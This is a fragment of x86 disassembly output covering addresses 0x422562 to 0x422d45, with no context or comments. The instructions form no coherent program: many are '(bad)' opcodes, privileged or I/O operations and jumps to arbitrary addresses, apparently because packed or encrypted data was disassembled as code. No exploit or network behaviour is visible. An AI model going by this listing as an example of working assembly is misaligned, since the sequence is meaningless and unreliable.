  422562:	js     0x42255d
  422564:	sbb    DWORD PTR [edx-0x56],ebp
  422567:	jle    0x4225db
  422569:	dec    esi
  42256a:	ret    0xa3b5
  42256d:	pop    ss
  42256e:	stc    
  42256f:	xchg   dh,bh
  422571:	jge    0x42256b
  422573:	push   ecx
  422574:	and    eax,0xb921c975
  422579:	leave  
  42257a:	xor    al,0xcc
  42257c:	add    ecx,DWORD PTR [edi+esi*1+0x5f3d7a5d]
  422583:	stc    
  422584:	les    ebp,FWORD PTR [ebp+0x44]
  422587:	xor    edx,DWORD PTR [edi+0xce8bc9f]
  42258d:	jl     0x4225c0
  42258f:	xor    al,0xa9
  422591:	aaa    
  422592:	fbld   TBYTE PTR [esp+edi*8]
  422595:	sub    BYTE PTR [ebx+0x4754883e],0xe5
  42259c:	out    0xed,al
  42259e:	or     DWORD PTR [ebx-0x34788e9],0x3fae15c4
  4225a8:	ja     0x422547
  4225aa:	int    0x67
  4225ac:	(bad)  
  4225ad:	and    edi,DWORD PTR [esi+0x7f]
  4225b0:	test   DWORD PTR [eax-0x54022059],0xbfaefe3c
  4225ba:	iret   
  4225bb:	mov    ebp,0x3fa4c76b
  4225c0:	(bad)  
  4225c1:	jmp    0x42259f
  4225c3:	jns    0x4225ae
  4225c5:	push   es
  4225c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225c7:	das    
  4225c8:	popf   
  4225c9:	arpl   cx,bx
  4225cb:	and    eax,0xdc167676
  4225d0:	pop    edx
  4225d1:	lds    ebp,FWORD PTR [esi+edi*4+0x325af190]
  4225d8:	repnz and BYTE PTR [eax+0x4c53bd4],dl
  4225df:	enter  0x11ea,0x8f
  4225e3:	(bad)  
  4225e4:	int3   
  4225e5:	and    DWORD PTR [ebx-0x78],0x10
  4225e9:	out    0x4,eax
  4225eb:	daa    
  4225ec:	loopne 0x4225b5
  4225ee:	xor    cl,BYTE PTR [edx+0x6e]
  4225f1:	aad    0x2b
  4225f3:	pop    es
  4225f4:	rcl    BYTE PTR [ebx+eiz*8-0xa],0x41
  4225f9:	sub    BYTE PTR [esi],ch
  4225fb:	imul   esi,esi,0xfffffffd
  4225fe:	retf   0x10ee
  422601:	add    BYTE PTR [edx-0x18],dh
  422604:	push   ds
  422605:	lods   al,BYTE PTR ds:[esi]
  422606:	sbb    eax,0xbb24244f
  42260b:	inc    edx
  42260c:	xlat   BYTE PTR ds:[ebx]
  42260d:	or     al,0x8b
  42260f:	xor    dh,0x5b
  422612:	inc    esp
  422613:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422614:	mov    bl,0xf6
  422616:	pop    esi
  422617:	xchg   ebp,eax
  422618:	jo     0x422603
  42261a:	mov    al,0x9f
  42261c:	mov    al,0x96
  42261e:	ja     0x422647
  422620:	or     edx,DWORD PTR [edx+0x33]
  422623:	mov    ah,0x1c
  422625:	ins    DWORD PTR es:[edi],dx
  422626:	enter  0x2b67,0xd
  42262a:	into   
  42262b:	jl     0x4225ae
  42262d:	sbb    ecx,DWORD PTR [edi+0x11350184]
  422633:	push   ecx
  422634:	retf   
  422635:	test   eax,0x90642e2d
  42263a:	or     DWORD PTR ds:0xd1a49950,ebp
  422640:	dec    ebp
  422641:	mov    dh,0xbd
  422643:	popf   
  422644:	lahf   
  422645:	mov    eax,DWORD PTR [esi+0x7d]
  422648:	pop    edi
  422649:	sbb    ebp,DWORD PTR [esi+esi*4]
  42264c:	jmp    0xd1c76446
  422651:	fstp   DWORD PTR [ecx]
  422653:	ins    BYTE PTR es:[edi],dx
  422654:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422655:	push   ecx
  422656:	adc    BYTE PTR [esi],cl
  422658:	jns    0x4225e5
  42265a:	lock ins BYTE PTR es:[edi],dx
  42265c:	adc    BYTE PTR [edi+0xb],bl
  42265f:	adc    esp,edx
  422661:	cwde   
  422662:	or     DWORD PTR [eax-0x5a],eax
  422665:	mov    dl,0xc7
  422667:	mov    dh,0xf6
  422669:	mov    eax,ds:0xec756356
  42266e:	jns    0x422669
  422670:	clc    
  422671:	cld    
  422672:	sbb    DWORD PTR [esi-0x43],ebp
  422675:	js     0x422612
  422677:	push   ebx
  422678:	pop    ss
  422679:	ja     0x4226b4
  42267b:	sub    al,0xf7
  42267d:	mov    eax,0x2829e8bc
  422682:	mov    ds:0xd40d8d85,al
  422687:	xor    dl,BYTE PTR [eax+0x75]
  42268a:	or     al,0x76
  42268c:	fild   QWORD PTR [eax+0x23ac6475]
  422692:	stos   DWORD PTR es:[edi],eax
  422693:	push   edx
  422694:	fst    DWORD PTR [edx+ecx*4-0x771c0bd8]
  42269b:	div    BYTE PTR [eax]
  42269d:	push   edx
  42269e:	ror    BYTE PTR [ebp+0x73],1
  4226a1:	(bad)  
  4226a2:	xchg   ecx,eax
  4226a3:	sbb    cl,BYTE PTR [edx+0x3cffb291]
  4226a9:	push   0x212c89f5
  4226ae:	cli    
  4226af:	ins    BYTE PTR es:[edi],dx
  4226b0:	sub    eax,0x16a1152e
  4226b5:	mov    al,0xd1
  4226b7:	popf   
  4226b8:	clc    
  4226b9:	pop    eax
  4226ba:	mov    esp,0xe489dba5
  4226bf:	sub    eax,0x6f01f836
  4226c4:	jo     0xba0664ca
  4226ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226cb:	mov    edi,0x1a6ab9a3
  4226d0:	sbb    esp,DWORD PTR [ebp+ebp*4+0x36]
  4226d4:	ficom  WORD PTR [edx]
  4226d6:	mov    dl,0x46
  4226d8:	cld    
  4226d9:	int    0xb8
  4226db:	jg     0x42271f
  4226dd:	push   es
  4226de:	in     eax,dx
  4226df:	add    DWORD PTR ds:[esi+0x70eac8f5],eax
  4226e6:	lea    eax,[eax]
  4226e8:	xchg   DWORD PTR [edi+0x4a],ebx
  4226eb:	fdiv   st(1),st
  4226ed:	in     eax,0xc7
  4226ef:	stc    
  4226f0:	push   ebx
  4226f1:	dec    edi
  4226f2:	jl     0x42270b
  4226f4:	scas   eax,DWORD PTR es:[edi]
  4226f5:	jns    0x4226db
  4226f7:	imul   edi,DWORD PTR [esi-0x8],0x1df27789
  4226fe:	push   edi
  4226ff:	push   ds
  422700:	inc    ebp
  422701:	pop    ss
  422702:	aad    0xeb
  422704:	cld    
  422705:	fs pop ss
  422707:	fimul  WORD PTR [eax+0x36a2a551]
  42270d:	bound  ebp,QWORD PTR [edx-0x14]
  422710:	out    dx,al
  422711:	out    dx,al
  422712:	shl    BYTE PTR [ebp-0xb05c72],1
  422718:	sbb    DWORD PTR [eax-0x291ceee2],edx
  42271e:	lea    esp,[ebx+0x2c]
  422721:	xchg   esp,eax
  422722:	imul   edx,DWORD PTR [ebx],0x19
  422725:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422726:	mov    esi,0x2bedbc2e
  42272b:	test   al,0x55
  42272d:	mov    ecx,0x4a436779
  422732:	ret    0x9695
  422735:	adc    ch,BYTE PTR [esi+ecx*2-0xa04a0e]
  42273c:	dec    ecx
  42273d:	into   
  42273e:	in     eax,0x27
  422740:	clc    
  422741:	sub    bh,BYTE PTR [edi-0x38]
  422744:	lea    ebp,[edi-0x1]
  422747:	neg    eax
  422749:	cmp    eax,0xf19d8d75
  42274e:	sbb    dh,BYTE PTR [edi+0x5949bb9f]
  422754:	jnp    0x4227a1
  422756:	sub    eax,0x9adf9f2d
  42275b:	add    DWORD PTR [eax-0x1e],edx
  42275e:	(bad)  
  42275f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422760:	fidiv  DWORD PTR [esi+0x7a]
  422763:	arpl   dx,bp
  422765:	sahf   
  422766:	fimul  WORD PTR [edx]
  422768:	push   eax
  422769:	jne    0x422735
  42276b:	sub    DWORD PTR ds:0x6111631e,0xf8a59c1b
  422775:	sub    al,0x3
  422777:	add    ah,0x12
  42277a:	bound  ebp,QWORD PTR [edx-0x30]
  42277d:	sbb    cl,ch
  42277f:	inc    esp
  422780:	add    eax,0x11488d4a
  422785:	test   al,0x22
  422787:	loopne 0x4227ad
  422789:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42278a:	in     eax,dx
  42278b:	cs lock sti 
  42278e:	lods   eax,DWORD PTR ds:[esi]
  42278f:	int    0x30
  422791:	and    BYTE PTR [ebp+eiz*4-0xfdf775f],cl
  422798:	push   0x40
  42279a:	imul   ebp,DWORD PTR fs:[eax-0x5aa5933b],0xffffffa5
  4227a2:	inc    ecx
  4227a3:	cmp    BYTE PTR [ecx-0x3],dl
  4227a6:	repz cmp BYTE PTR [edx],ch
  4227a9:	nop
  4227aa:	inc    eax
  4227ab:	adc    al,BYTE PTR [ecx-0x44]
  4227ae:	inc    ebp
  4227af:	cs out dx,eax
  4227b1:	and    eax,0x9e7566ca
  4227b6:	dec    edx
  4227b7:	cmp    BYTE PTR [edx-0x78],dh
  4227ba:	dec    ebx
  4227bb:	inc    esi
  4227bc:	sbb    eax,0x1b064d1d
  4227c1:	jmp    0x6b666bcb
  4227c6:	sub    al,dl
  4227c8:	lods   eax,DWORD PTR ds:[esi]
  4227c9:	xor    al,0xa0
  4227cb:	inc    ecx
  4227cc:	jbe    0x4227fd
  4227ce:	gs (bad) 
  4227d0:	addr16 xor cl,bh
  4227d3:	in     eax,dx
  4227d4:	fcomi  st,st(3)
  4227d6:	sbb    dh,BYTE PTR [edi]
  4227d8:	mov    ebp,eax
  4227da:	imul   DWORD PTR [edx-0x609063fc]
  4227e0:	sub    eax,0xee7e2f8e
  4227e5:	sbb    ebp,ebx
  4227e7:	push   0xd6b099f1
  4227ec:	pop    ss
  4227ed:	rol    ah,1
  4227ef:	inc    eax
  4227f0:	sahf   
  4227f1:	bound  esp,QWORD PTR [edx]
  4227f3:	shr    BYTE PTR ds:0x2f258932,1
  4227f9:	pop    edi
  4227fa:	pop    ebx
  4227fb:	xor    bl,al
  4227fd:	shl    BYTE PTR [ebp+0x1e64e8cd],0x5e
  422804:	add    eax,0x38acde38
  422809:	pop    edx
  42280a:	pop    ds
  42280b:	xor    eax,ebp
  42280d:	enter  0x70f1,0xc4
  422811:	push   0x7d
  422813:	les    edi,FWORD PTR [eax]
  422815:	lods   al,BYTE PTR ds:[esi]
  422816:	(bad)  [ebp+eax*4+0x29582871]
  42281d:	pop    eax
  42281e:	icebp  
  42281f:	push   ebp
  422820:	lock gs pop ebp
  422823:	sbb    DWORD PTR [edi],esi
  422825:	(bad)  
  422826:	jp     0x42281c
  422828:	pop    ecx
  422829:	or     eax,DWORD PTR [esi-0x2b767ab5]
  42282f:	scas   al,BYTE PTR es:[edi]
  422830:	add    al,0xdc
  422832:	push   edx
  422833:	and    DWORD PTR [ecx+0x3e37518],0x59
  42283a:	jmp    0x698f:0xa385a780
  422841:	stos   DWORD PTR es:[edi],eax
  422842:	push   0xffffffbe
  422844:	fild   WORD PTR [ecx]
  422846:	add    ebp,ebx
  422848:	data16 xor ch,bh
  42284b:	or     ch,BYTE PTR [esi+0xf]
  42284e:	mov    BYTE PTR [eax],al
  422850:	sahf   
  422851:	icebp  
  422852:	sbb    dh,BYTE PTR [ecx]
  422854:	dec    esp
  422855:	addr16 inc eax
  422857:	and    al,0x9a
  422859:	xor    DWORD PTR [eax],esp
  42285b:	cmp    bh,ah
  42285d:	fisubr DWORD PTR [ebp+0x19a68439]
  422863:	push   0xc69dc048
  422868:	cmp    BYTE PTR [esi+edx*1],dl
  42286b:	retf   
  42286c:	mov    ?,WORD PTR [esi-0x27]
  42286f:	jae    0x4228b7
  422871:	cs jae 0x42286f
  422874:	sub    ebp,DWORD PTR [edi]
  422876:	push   ebx
  422877:	ds cli 
  422879:	adc    BYTE PTR [edi-0x1],dl
  42287c:	pushf  
  42287d:	repnz sti 
  42287f:	das    
  422880:	jl     0x422813
  422882:	mov    ebp,0x3e37877e
  422887:	cli    
  422888:	jp     0x422848
  42288a:	hlt    
  42288b:	mov    ch,0x3f
  42288d:	inc    esi
  42288e:	mov    edx,0xc3cce70c
  422893:	in     al,0x91
  422895:	bound  eax,QWORD PTR [edi-0x7a]
  422898:	fs loope 0x422897
  42289b:	cdq    
  42289c:	mov    bl,0xbc
  42289e:	lock loop 0x4228ee
  4228a1:	jb     0x422890
  4228a3:	cmp    edi,edi
  4228a5:	clc    
  4228a6:	add    eax,0x5bcdd5cf
  4228ab:	pusha  
  4228ac:	sbb    esp,DWORD PTR [ebx-0x13]
  4228af:	fnstsw WORD PTR [ecx+0x38]
  4228b2:	in     al,dx
  4228b3:	dec    esi
  4228b4:	shr    DWORD PTR [edx],1
  4228b6:	pop    esp
  4228b7:	or     eax,0xb71b941d
  4228bc:	push   es
  4228bd:	jb     0x42285e
  4228bf:	mov    ecx,0xa5c17678
  4228c4:	daa    
  4228c5:	cs jno 0x4228bb
  4228c8:	stc    
  4228c9:	fwait
  4228ca:	sub    BYTE PTR [ebx-0x4],bh
  4228cd:	jmp    0x4228ae
  4228cf:	neg    BYTE PTR [edi]
  4228d1:	inc    eax
  4228d2:	mov    esi,0x7eebf1c3
  4228d7:	sbb    edi,DWORD PTR [ebx]
  4228d9:	(bad)  
  4228db:	out    dx,al
  4228dc:	(bad)  
  4228dd:	fild   WORD PTR [ebx+0x4e4122aa]
  4228e3:	pop    ecx
  4228e4:	outs   dx,DWORD PTR ss:[esi]
  4228e6:	inc    ecx
  4228e7:	cs or  ecx,ecx
  4228ea:	push   ds
  4228eb:	out    0x6b,al
  4228ed:	sub    DWORD PTR [esi-0x2994dc27],0x18
  4228f4:	cld    
  4228f5:	fsub   st,st(6)
  4228f7:	es mov dh,0x76
  4228fa:	ficomp WORD PTR [ebx+eax*2+0x44aa185d]
  422901:	and    DWORD PTR [esi+0x24af1f9f],ecx
  422907:	popa   
  422908:	jo     0x422977
  42290a:	fsubr  QWORD PTR [ebp-0x54b956f7]
  422910:	ins    DWORD PTR es:[edi],dx
  422911:	test   BYTE PTR [ebx-0x7b],ah
  422914:	dec    ecx
  422915:	and    BYTE PTR [eax],ah
  422917:	lds    edi,FWORD PTR [esp+eax*8+0x5702fd58]
  42291e:	push   edi
  42291f:	and    BYTE PTR [ebp+0x62],cl
  422922:	lahf   
  422923:	jbe    0x42294f
  422925:	es adc al,0xd0
  422928:	xor    DWORD PTR es:[ecx+0x6b5a24ce],ebx
  42292f:	mov    esp,0x286b4041
  422934:	or     al,0x65
  422936:	mov    al,al
  422938:	mov    esi,0xa1d9940c
  42293d:	push   es
  42293e:	push   0x48
  422940:	jno    0x422980
  422942:	inc    ecx
  422943:	fdivr  QWORD PTR [ecx-0x2b]
  422946:	mov    BYTE PTR [ecx*8+0x1e109f02],0x44
  42294e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42294f:	or     eax,0xfe8371d9
  422954:	in     eax,dx
  422955:	std    
  422956:	sub    esi,DWORD PTR [ebx-0x4298b728]
  42295c:	shl    DWORD PTR [ebp+ebx*8-0x2fec2969],0x50
  422964:	inc    esi
  422965:	sti    
  422966:	sbb    al,0x36
  422968:	lea    edx,[edx+0xf]
  42296b:	mov    ebx,0x137e4b9a
  422970:	or     DWORD PTR [ebx],ebx
  422972:	add    DWORD PTR [eax+0x1e3413a5],esp
  422978:	and    bl,BYTE PTR [esi-0x39]
  42297b:	cwde   
  42297c:	pushf  
  42297d:	inc    eax
  42297e:	fldcw  WORD PTR [eax]
  422980:	std    
  422981:	push   edx
  422982:	call   0x75a8f2c0
  422987:	popf   
  422988:	push   0xffffffca
  42298a:	fnsave [edx-0x34]
  42298d:	mov    edx,0x140ca0ee
  422992:	pop    ebx
  422993:	mov    bl,0x19
  422995:	mov    fs,WORD PTR [eax-0x10]
  422998:	mov    edx,0xaef555be
  42299d:	cmp    eax,0x898c758c
  4229a2:	not    DWORD PTR [edi+eiz*4-0x5fb9f36e]
  4229a9:	loopne 0x4229ee
  4229ab:	fs stos BYTE PTR es:[edi],al
  4229ad:	or     DWORD PTR ds:0x7dbdd2da,esi
  4229b3:	cmp    eax,0x308cb316
  4229b8:	pop    eax
  4229b9:	dec    esp
  4229ba:	xchg   DWORD PTR [edx+0x77beda0e],ecx
  4229c0:	jne    0x422a28
  4229c2:	or     eax,0xe98c7022
  4229c7:	iret   
  4229c8:	scas   al,BYTE PTR es:[edi]
  4229c9:	test   ah,ch
  4229cb:	adc    DWORD PTR [ebx-0x20fc18c4],ebx
  4229d1:	mov    esi,0x81f00765
  4229d6:	(bad)  
  4229d8:	sar    BYTE PTR [esi-0xa],0x99
  4229dc:	xor    BYTE PTR [bp+di],dh
  4229df:	mov    bl,0x68
  4229e1:	sbb    bl,BYTE PTR [ecx-0x6e89040e]
  4229e7:	mov    bh,0xf0
  4229e9:	outs   dx,BYTE PTR ds:[esi]
  4229ea:	xor    ebp,eax
  4229ec:	outs   dx,DWORD PTR ds:[esi]
  4229ed:	pop    ss
  4229ee:	enter  0x169c,0xc4
  4229f2:	aad    0x28
  4229f4:	xor    BYTE PTR [edx+ecx*1+0x72],ch
  4229f8:	mov    al,0x62
  4229fa:	mul    esp
  4229fc:	push   cs
  4229fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4229fe:	in     eax,dx
  4229ff:	sub    dh,bh
  422a01:	jle    0x4229fa
  422a03:	idiv   DWORD PTR ss:[esi-0xa96e70c]
  422a0a:	sbb    eax,0xce1bc9dc
  422a0f:	mov    esp,0xdea798ed
  422a14:	xor    eax,0x5f9bf5f2
  422a19:	jae    0x4229de
  422a1b:	fst    QWORD PTR ds:0xc30387a0
  422a21:	xchg   edx,eax
  422a22:	bnd call 0xf6fa71d1
  422a28:	fwait
  422a29:	xchg   ebp,eax
  422a2a:	ds jns 0x422a4c
  422a2d:	shr    DWORD PTR [ebp+0x2e5e471b],0x4b
  422a34:	test   BYTE PTR [eax-0x427b3643],cl
  422a3a:	aas    
  422a3b:	shr    BYTE PTR [edx+0x2f6d05a7],0x1
  422a42:	lds    ebp,FWORD PTR [eax+0x7f7b72a9]
  422a48:	loopne 0x422a1e
  422a4a:	leave  
  422a4b:	mov    ebp,fs
  422a4d:	jge    0x422a8d
  422a4f:	std    
  422a50:	dec    ebx
  422a51:	(bad)  
  422a52:	repz fwait
  422a54:	outs   dx,DWORD PTR ds:[esi]
  422a55:	clc    
  422a56:	pop    ds
  422a57:	pusha  
  422a58:	mov    ecx,0x3de9fce2
  422a5d:	sahf   
  422a5e:	cmp    al,0xf3
  422a60:	xor    al,dh
  422a62:	dec    esi
  422a63:	xchg   edi,eax
  422a64:	cmp    al,0xe3
  422a66:	dec    edi
  422a67:	pop    ebx
  422a68:	in     al,0x84
  422a6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a6b:	xor    al,0xd5
  422a6d:	loope  0x422a81
  422a6f:	mov    cl,0xb8
  422a71:	and    esi,edx
  422a73:	fs jno 0x422a5a
  422a76:	jmp    0x422a24
  422a78:	lods   eax,DWORD PTR ds:[esi]
  422a79:	clc    
  422a7a:	les    edx,FWORD PTR [edi+0x52d1c494]
  422a80:	or     al,0x9a
  422a82:	mov    BYTE PTR ds:0x7fbf53bc,dl
  422a88:	jae    0x422a9c
  422a8a:	stos   BYTE PTR es:[edi],al
  422a8b:	dec    DWORD PTR [edi]
  422a8d:	jno    0x422a7e
  422a8f:	push   ds
  422a90:	in     eax,dx
  422a91:	dec    ecx
  422a92:	jbe    0x422a69
  422a94:	idiv   DWORD PTR [ebp-0xa]
  422a97:	test   eax,0xbeefdfaa
  422a9c:	mov    edx,0xafdbdf6f
  422aa1:	jmp    0x8f88c244
  422aa6:	sbb    DWORD PTR [ecx+0x23],ecx
  422aa9:	leave  
  422aaa:	adc    al,BYTE PTR [edx+0x20]
  422aad:	and    ecx,ecx
  422aaf:	pop    eax
  422ab0:	xor    cl,BYTE PTR [eax]
  422ab2:	mov    WORD PTR [edx+0x63],fs
  422ab5:	ins    BYTE PTR es:[edi],dx
  422ab6:	lock or esp,DWORD PTR [edi+0x39]
  422aba:	jbe    0x422ad8
  422abc:	xchg   ebx,eax
  422abd:	js     0x422ac4
  422abf:	xchg   esp,eax
  422ac1:	fs and eax,0xc096762b
  422ac7:	jbe    0x422adb
  422ac9:	daa    
  422aca:	lods   al,BYTE PTR ds:[esi]
  422acb:	gs daa 
  422acd:	fcom   DWORD PTR es:[edx+0x42]
  422ad1:	add    dh,cl
  422ad3:	and    eax,DWORD PTR [esi]
  422ad5:	arpl   ax,ax
  422ad7:	and    BYTE PTR ds:0xde8c080c,0x80
  422ade:	xor    al,0xb2
  422ae0:	nop
  422ae1:	xor    al,0xf
  422ae3:	inc    si
  422ae5:	repz shl BYTE PTR [edi+esi*8-0x13],cl
  422aea:	(bad)  
  422aeb:	in     eax,dx
  422aec:	fcomi  st,st(7)
  422aee:	std    
  422aef:	sti    
  422af0:	push   ebp
  422af1:	aad    0x39
  422af3:	cmp    edi,DWORD PTR [edi-0x14]
  422af6:	jge    0x422b46
  422af8:	aad    0xed
  422afa:	sbb    DWORD PTR [eax-0x66],eax
  422afd:	jmp    0x73fc7573
  422b02:	outs   dx,DWORD PTR ds:[esi]
  422b03:	xlat   BYTE PTR ds:[ebx]
  422b04:	scas   eax,DWORD PTR es:[edi]
  422b05:	jle    0x422afc
  422b07:	cmp    BYTE PTR [ebp-0xa],dh
  422b0a:	(bad)  
  422b0c:	std    
  422b0d:	fisttp QWORD PTR [edi+0x6408563]
  422b13:	jecxz  0x422b1a
  422b15:	fs enter 0xefeb,0x35
  422b1a:	push   eax
  422b1b:	addr16 popa 
  422b1d:	int3   
  422b1e:	fnstenv [eax-0x6e]
  422b21:	jmp    0x422b10
  422b23:	xor    ebp,esp
  422b25:	fdivr  QWORD PTR [ebx-0x44]
  422b28:	sbb    eax,0x2f8c0e73
  422b2d:	retf   0xcbc8
  422b30:	jg     0x422abd
  422b32:	pop    edx
  422b33:	xchg   esp,eax
  422b34:	inc    eax
  422b35:	jae    0x422b79
  422b37:	into   
  422b38:	or     BYTE PTR [ebp-0x5f0857d7],ch
  422b3e:	mov    bl,0xcf
  422b40:	in     al,dx
  422b41:	inc    edx
  422b42:	inc    esi
  422b43:	ds data16 ja 0x422b87
  422b47:	fsub   QWORD PTR [ebp+0x30]
  422b4a:	adc    al,0x12
  422b4c:	xor    cl,BYTE PTR [edi+eiz*2+0x10]
  422b50:	aam    0xa4
  422b52:	mov    dh,0x40
  422b54:	push   0x64433216
  422b59:	pop    ecx
  422b5a:	clc    
  422b5b:	mov    ch,0x40
  422b5d:	icebp  
  422b5e:	mov    esp,0x482db95c
  422b63:	inc    edx
  422b64:	cmp    DWORD PTR [esi],ebx
  422b66:	daa    
  422b67:	daa    
  422b68:	retf   
  422b69:	fistp  WORD PTR [ecx]
  422b6b:	gs clc 
  422b6d:	xor    DWORD PTR [esi+0x18],eax
  422b70:	mov    ss,WORD PTR [eax]
  422b72:	inc    ecx
  422b73:	sbb    al,BYTE PTR [edi+edi*2]
  422b76:	pushf  
  422b77:	add    eax,DWORD PTR [eax+0x49]
  422b7a:	push   ebx
  422b7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b7c:	sub    BYTE PTR [eax-0x1a73a5f],dl
  422b82:	icebp  
  422b83:	test   BYTE PTR [edi+0x69334a4],ch
  422b89:	push   esp
  422b8a:	cwde   
  422b8b:	iret   
  422b8c:	out    0x4,al
  422b8e:	push   ss
  422b8f:	dec    eax
  422b90:	fstp   QWORD PTR [ecx+ebx*2+0x6fa43804]
  422b97:	addr16 xchg esi,eax
  422b99:	rol    DWORD PTR [edi],0xc4
  422b9c:	adc    cl,BYTE PTR ds:[edx+0x23]
  422ba0:	(bad)  
  422ba1:	dec    eax
  422ba2:	lahf   
  422ba3:	int3   
  422ba4:	dec    ebp
  422ba5:	retf   
  422ba6:	out    dx,eax
  422ba7:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  422ba9:	jbe    0x422b98
  422bab:	dec    esi
  422bac:	lods   al,BYTE PTR ds:[esi]
  422bad:	adc    eax,0xebca181b
  422bb2:	jge    0x422b60
  422bb4:	bound  edx,QWORD PTR [eax-0x5e]
  422bb7:	cwde   
  422bb8:	(bad)
  422bbd:	lds    esp,FWORD PTR [eax-0x77]
  422bc0:	(bad)
  422bc3:	xchg   DWORD PTR [edx],eax
  422bc5:	jne    0x422b4b
  422bc7:	fmul   st(4),st
  422bc9:	add    BYTE PTR [edx+0x5f],ch
  422bcc:	pop    ss
  422bcd:	inc    esp
  422bce:	std    
  422bcf:	bound  esi,QWORD PTR [esi+0x8015aaf]
  422bd5:	lock add edi,DWORD PTR [ebx-0xe07a991]
  422bdc:	test   al,0xaa
  422bde:	jne    0x422ba9
  422be0:	int3   
  422be1:	repz pop esp
  422be3:	js     0x422bb9
  422be5:	push   edi
  422be6:	enter  0x48b5,0x66
  422bea:	mov    ecx,0x900f92c9
  422bef:	xchg   ecx,eax
  422bf0:	add    ebx,DWORD PTR [ecx-0x5105ebc0]
  422bf6:	daa    
  422bf7:	push   esp
  422bf8:	add    ecx,ebx
  422bfa:	lahf   
  422bfb:	mov    bl,0xb4
  422bfd:	mov    edx,0xb385a9c4
  422c02:	push   ss
  422c03:	or     eax,0x6db40958
  422c08:	(bad)  
  422c09:	(bad)  
  422c0a:	iret   
  422c0b:	pop    ebp
  422c0c:	out    0xb6,al
  422c0e:	lock dec esi
  422c10:	(bad)  
  422c11:	fidivr WORD PTR [ebp+ecx*8+0x3426f6d6]
  422c18:	add    DWORD PTR [esi+0x63844c82],esp
  422c1e:	sub    ebp,DWORD PTR [ebx]
  422c20:	mov    BYTE PTR [esi+eiz*8],al
  422c23:	mov    edi,0x755b0ef1
  422c28:	and    eax,0xeab0897
  422c2d:	dec    edx
  422c2e:	sub    DWORD PTR es:[edx-0x1f],ebx
  422c32:	in     eax,0xba
  422c34:	or     DWORD PTR [edi-0x7e],ebx
  422c37:	enter  0x30ee,0x39
  422c3b:	jp     0x422c26
  422c3d:	int    0xb5
  422c3f:	and    cl,al
  422c41:	leave  
  422c42:	push   ebx
  422c43:	div    DWORD PTR [eax-0xb]
  422c46:	loop   0x422c9d
  422c48:	stos   BYTE PTR es:[edi],al
  422c49:	iret   
  422c4a:	mov    esp,0xdc0950f
  422c4f:	dec    ecx
  422c50:	jl     0x422cc0
  422c52:	popa   
  422c53:	dec    esi
  422c54:	or     BYTE PTR ds:0xada6ab0b,ch
  422c5a:	dec    edi
  422c5b:	popf   
  422c5c:	cwde   
  422c5d:	mov    ds:0x607e67a9,al
  422c62:	mov    ch,0xe3
  422c64:	dec    eax
  422c65:	mov    al,ds:0x174c3699
  422c6a:	sbb    esp,edi
  422c6c:	sbb    esp,DWORD PTR [eax-0x6a]
  422c6f:	adc    bl,bl
  422c71:	xchg   DWORD PTR [ecx],edx
  422c73:	das    
  422c74:	shl    bl,cl
  422c76:	fsubp  st(6),st
  422c78:	test   eax,0xa9e2f694
  422c7d:	mov    ebp,0xad760003
  422c82:	cdq    
  422c83:	xor    edi,DWORD PTR [esi]
  422c85:	mov    al,0x12
  422c87:	(bad)  
  422c88:	les    edx,FWORD PTR [edx-0xf648d92]
  422c8e:	inc    eax
  422c8f:	and    al,0x8a
  422c91:	and    bh,BYTE PTR [eax+0x56]
  422c94:	bound  ebx,QWORD PTR [ecx-0x5fd861f9]
  422c9a:	sahf   
  422c9b:	fst    DWORD PTR [edi-0xce9d9d3]
  422ca1:	pop    ss
  422ca2:	das    
  422ca3:	and    esi,DWORD PTR [esp+ebp*8+0x39a5d340]
  422caa:	cmc    
  422cab:	push   ss
  422cac:	ins    BYTE PTR es:[edi],dx
  422cad:	test   al,0x72
  422caf:	inc    esi
  422cb0:	pusha  
  422cb1:	mov    BYTE PTR [esi],dl
  422cb3:	mov    edi,0x6c368746
  422cb8:	jmp    0xcfa2:0xb988697e
  422cbf:	iret   
  422cc0:	pushf  
  422cc1:	mov    dl,0xf0
  422cc3:	jb     0xbfc08cf1
  422cc9:	addr16 xor al,0xe6
  422ccc:	sti    
  422ccd:	sbb    al,0x27
  422ccf:	(bad)  
  422cd0:	fs gs ret 
  422cd3:	enter  0x2f6f,0x1c
  422cd7:	inc    eax
  422cd8:	imul   ch
  422cda:	and    esi,DWORD PTR [esi]
  422cdc:	lahf   
  422cdd:	jb     0x422cc3
  422cdf:	ret    0x96bf
  422ce2:	stc    
  422ce3:	pop    es
  422ce4:	jae    0x422c6b
  422ce6:	push   es
  422ce7:	and    al,0x90
  422ce9:	mov    DWORD PTR [eax-0x33],ecx
  422cec:	ins    DWORD PTR es:[edi],dx
  422ced:	retf   
  422cee:	aad    0xd
  422cf0:	dec    edi
  422cf1:	mov    esi,0xc84f98dc
  422cf6:	outs   dx,BYTE PTR ds:[esi]
  422cf7:	imul   eax,DWORD PTR [esi-0x145401bb],0x342123
  422d01:	ins    BYTE PTR es:[edi],dx
  422d02:	pop    edi
  422d03:	fldenv [ebp+esi*2+0x72]
  422d07:	mov    ah,BYTE PTR [ecx+ecx*4-0x39784192]
  422d0e:	fsubrp st(0),st
  422d10:	cmp    BYTE PTR [esi+0x3ab25bb4],bh
  422d16:	mov    bl,ah
  422d18:	into   
  422d19:	or     eax,0x871b2b40
  422d1e:	rol    cl,cl
  422d20:	sbb    ebx,ecx
  422d22:	mov    dl,cl
  422d24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d25:	adc    BYTE PTR [esi+esi*4-0x693ba1b1],al
  422d2c:	dec    eax
  422d2d:	(bad)  
  422d2e:	ror    BYTE PTR [ebx+0x347d7e11],cl
  422d34:	(bad)  
  422d35:	es es and eax,0x6f075d57
  422d3c:	mov    ecx,0x43113513
  422d41:	add    BYTE PTR [ebp+0x20],ch
  422d44:	int3   
  422d45:	xchg   ecx,eax
